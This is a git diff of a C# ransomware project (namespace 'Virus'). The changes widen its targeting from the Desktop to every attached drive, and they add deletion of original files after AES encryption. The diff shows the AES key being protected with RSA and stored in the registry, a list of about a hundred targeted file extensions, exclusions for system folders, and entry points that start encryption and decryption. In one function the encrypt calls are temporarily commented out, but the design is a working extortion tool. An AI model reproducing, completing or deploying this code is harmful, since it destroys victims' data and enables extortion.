@@ -3,19 +3,17 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
-using System.Security;
 using System.Security.Cryptography;
 using System.Text;
 using System.Windows.Forms;
 using static Virus.RegHelpers;
-using static Virus.Form2;
 using System.Linq;
 
 namespace Virus
 {
     class AESencryption
     {
-        //TODO Remove  && !f.Contains(".ignore") from this document.
+        //Vairables
         private static string _encryptedExtension = ".encrypt";
         public static char[] _aesKey;  //generate random key
         private static bool _DeleteAfterDecrypt = true;
@@ -79,10 +77,6 @@ namespace Virus
                 return result;
             }
         }
-
-        //  Call this function to remove the key from memory after use for security
-        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
-        public static extern bool ZeroMemory(IntPtr Destination, int Length);
 
         /// <summary>
         /// Creates a random salt that will be used to encrypt your file. This method is required on FileEncrypt.
@@ -168,6 +162,10 @@ namespace Virus
                 File.AppendAllText(encrypttxt, $"\n{inputFile}");
                 cs.Close();
                 fsCrypt.Close();
+                if(_DeleteAfterEncrypt == true)
+                {
+                    File.Delete(inputFile);
+                }
             }
         }
 
@@ -210,6 +208,7 @@ namespace Virus
                 {
                     Application.DoEvents();
                     fsOut.Write(buffer, 0, read);
+
                 }
             }
             catch (CryptographicException ex_CryptographicException)
@@ -233,166 +232,57 @@ namespace Virus
             {
                 fsOut.Close();
                 fsCrypt.Close();
-            }
-        }
 
-        /// <summary>
-        /// Public Method to start encrypting
-        /// </summary>
-        public static void StartEncryption()
-        {
-            if (_aesKey == null)
-            {
-                _aesKey = GenerateRandomCharArray(32); //Created
-                Debug.WriteLine(_aesKey);
-                SetAESkey(RSAencryption.Encrypt(_aesKey)); //encrypt the aes key using rsa store in registry
-            }
-            List<string> dirToEncrypt = new List<string>() { DESKTOP_FOLDER, /*DOCUMENTS_FOLDER,DOWNLOADS_FOLDER, PICTURES_FOLDER, MUSIC_FOLDER, VIDEOS_FOLDER*/ };
-            foreach (var dir in dirToEncrypt)
-            {
-                encryptFolderContents(dir, _aesKey);
-            }
-            for (int i = 0; i < _aesKey.Length; i++)    //blanks out char array
-            {
-                _aesKey[i] = '\0';
-            }
-
-
-        }
-
-        /// <summary>
-        /// Public Method To Start Decryption
-        /// </summary>
-        /// <param name="privkeytypedin"></param>
-        /// <returns></returns>
-        public static bool StartDecryption(string privkeytypedin)
-        {
-
-            char[] decryptedaeskey = RSAencryption.Decrypt(GetAESkey(), privkeytypedin);
-            List<string> dirToDecrypt = new List<string>() { DESKTOP_FOLDER,/* DOCUMENTS_FOLDER, DOWNLOADS_FOLDER, PICTURES_FOLDER, MUSIC_FOLDER, VIDEOS_FOLDER*/ };
-
-            foreach (var dir in dirToDecrypt)
-            {
-                try
+                if(_DeleteAfterDecrypt == true)
                 {
-                    decryptFolderContents(dir, decryptedaeskey);
-                }
-                catch { }
-            }
-
-
-            return true; //return anythinfg to make awaitable.
-        }
-
-        /// <summary>
-        /// Used for encrypting folder contents inside directories/other folders.
-        /// </summary>
-        /// <param name="sDir"></param>
-        /// <param name="_aesKey"></param>
-        static void encryptFolderContents(string sDir, char[] _aesKey)
-        {
-            try
-            {
-                foreach (string f in Directory.GetFiles(sDir))
-                {
-                    try
-                    {
-                        if (!f.Contains(_encryptedExtension) && !f.Contains(".ignore") && f != System.AppDomain.CurrentDomain.FriendlyName && f != instructionstxt && f != encrypttxt && f != decryptexe)
-                        {
-                            Debug.WriteLine("Encrypting: " + f);
-                            FileEncrypt(f, _aesKey);
-                            _encryptedFileCount++;
-                            Debug.WriteLine($"{_encryptedFileCount} {f}");
-                        }
-                    }
-                    catch (System.Exception excpt)
-                    {
-                        Console.WriteLine(excpt.Message);
-                    }
-                    if (_DeleteAfterEncrypt && File.Exists($"{f}{_encryptedExtension}"))
-                    {
-                        File.Delete(f);
-                        Debug.WriteLine($"{f} was deleted.");
-                    }
-                }
-
-                foreach (string d in Directory.GetDirectories(sDir))
-                {
-                    encryptFolderContents(d, _aesKey);
+                    File.Delete(inputFile);
                 }
             }
-            catch (System.Exception excpt)
-            {
-                Console.WriteLine(excpt.Message);
-            }
-
         }
-
-        /// <summary>
-        /// Used for decrypting folder contents inside directories/other folders.
-        /// </summary>
-        /// <param name="sDir"></param>
-        /// <param name="_aesKey"></param>
-        static void decryptFolderContents(string sDir, char[] _aesKey)
-        {
-            try
-            {
-                foreach (string f in Directory.GetFiles(sDir))
-                {
-                    try
-                    {
-                        if (f.Contains(_encryptedExtension) && !f.Contains(".ignore") && f != System.AppDomain.CurrentDomain.FriendlyName)
-                        {
-                            Console.Out.WriteLine("Decrypting: " + f);
-                            try
-                            {
-                                FileDecrypt(f, _aesKey);
-                                _encryptedFileCount--;
-                                if (_DeleteAfterDecrypt)
-                                {
-                                    File.Delete(f);
-                                }
-                            }
-                            catch
-                            {
-                                Debug.WriteLine($"Error decrypting {f}");
-                            }
-                        }
-                    }
-                    catch (System.Exception excpt)
-                    {
-                        Console.WriteLine(excpt.Message);
-                    }
-
-                }
-
-                foreach (string d in Directory.GetDirectories(sDir))
-                {
-                    decryptFolderContents(d, _aesKey);
-                }
-            }
-            catch (System.Exception excpt)
-            {
-                Console.WriteLine(excpt.Message);
-            }
-        }
-
-
 
         //STILL IN DEVELOPMENT
         private static readonly string[] extensionsToEncrypt = { "7z", "rar", "zip", "m3u", "m4a", "mp3", "wma", "ogg", "wav", "sqlite", "sqlite3", "img", "nrg", "tc", "doc", "docx", "docm", "odt", "rtf", "wpd", "wps", "csv", "key", "pdf", "pps", "ppt", "pptm", "pptx", "ps", "psd", "vcf", "xlr", "xls", "xlsx", "xlsm", "ods", "odp", "indd", "dwg", "dxf", "kml", "kmz", "gpx", "cad", "wmf", "txt", "3fr", "ari", "arw", "bay", "bmp", "cr2", "crw", "cxi", "dcr", "dng", "eip", "erf", "fff", "gif", "iiq", "j6i", "k25", "kdc", "mef", "mfw", "mos", "mrw", "nef", "nrw", "orf", "pef", "png", "raf", "raw", "rw2", "rwl", "rwz", "sr2", "srf", "srw", "x3f", "jpg", "jpeg", "tga", "tiff", "tif", "ai", "3g2", "3gp", "asf", "avi", "flv", "m4v", "mkv", "mov", "mp4", "mpg", "rm", "swf", "vob", "wmv" }; //files to decrypt
 
+        /// <summary>
+        /// Returns DriveInfo[] of all attached drives.
+        /// </summary>
+        /// <returns></returns>
         private static DriveInfo[] GetAttachedDrives()
         {
             return System.IO.DriveInfo.GetDrives();
         }
-        private static void EncryptDirectory(string targetDirectory, char[] aesKey)
+
+        /// <summary>
+        /// Function to encrypt and decrpyt directories.
+        /// </summary>
+        /// <param name="targetDirectory"></param>
+        /// <param name="aesKey"></param>
+        /// <param name="encrypt">true if you want to encrypt, false if you want to decrypt</param>
+        private static void EncryptOrDecryptDirectory(string targetDirectory, char[] aesKey, bool encrypt)
         {
             // Process the list of files found in the directory.
             var fileEntries = Directory.EnumerateFiles(targetDirectory, "*.*").Where(file => extensionsToEncrypt.Any(x => file.EndsWith(x, StringComparison.OrdinalIgnoreCase) && !file.Contains(_encryptedExtension)));
             foreach (string fileName in fileEntries)
             {
-                FileEncrypt(fileName, aesKey);
+                try
+                {
+                    
+                    if (encrypt == false)
+                    {
+                        Debug.WriteLine($"Would have decrypted {fileName}");
+                        //FileDecrypt(fileName, aesKey);
+                    }
+                    else if (encrypt == true)
+                    {
+                        Debug.WriteLine($"Would have encrypted {fileName}");
+                        //FileEncrypt(fileName, aesKey);
+                        Debug.WriteLine(_encryptedFileCount++);
+                    }
+                }
+                catch (System.Exception excpt)
+                {
+                    Console.WriteLine(excpt.Message);
+                }
             }
 
             // Recurse into subdirectories of this directory.
@@ -402,17 +292,50 @@ namespace Virus
                 {   //Dont go into windows program files and temporary internet files. And other #ew ugly
                     if (!subdirectory.Contains("All Users\\Microsoft\\") && !subdirectory.Contains("$Recycle.Bin") && !subdirectory.Contains("C:\\Windows") && !subdirectory.Contains("C:\\Program Files") && !subdirectory.Contains("Temporary Internet Files") && !subdirectory.Contains("AppData\\") && !subdirectory.Contains("\\source\\") && !subdirectory.Contains("C:\\ProgramData\\"))
                     {
-                        EncryptDirectory(subdirectory, aesKey);
+                        EncryptOrDecryptDirectory(subdirectory, aesKey, encrypt);
                     }
 
                 }
-                catch
+                catch (System.Exception excpt)
                 {
+                    Console.WriteLine(excpt.Message);
                 }
         }
+        public static void StartEncryption()
+        {
+            if (_aesKey == null)
+            {
+                _aesKey = GenerateRandomCharArray(32); //Created
+                SetAESkey(RSAencryption.Encrypt(_aesKey)); //encrypt the aes key using rsa store in registry
+            }   //gets aes key
+
+            DriveInfo[] myDrives = GetAttachedDrives();
+            foreach (DriveInfo drive in myDrives)
+            {
+                EncryptOrDecryptDirectory(drive.Name, _aesKey, true);
+            }
 
 
-    }
+            for (int i = 0; i < _aesKey.Length; i++)    //blanks out char array
+            {
+                _aesKey[i] = '\0';
+            }
+
+        }
+        public static void StartDecryption(string privkeytypedin)
+        {
+            _aesKey = RSAencryption.Decrypt(GetAESkey(), privkeytypedin);
+
+            DriveInfo[] myDrives = GetAttachedDrives();
+            foreach (DriveInfo drive in myDrives)
+            {
+                EncryptOrDecryptDirectory(drive.Name, _aesKey, false);
+            }
+
+        }
+
+        
+    } 
 }
 
 
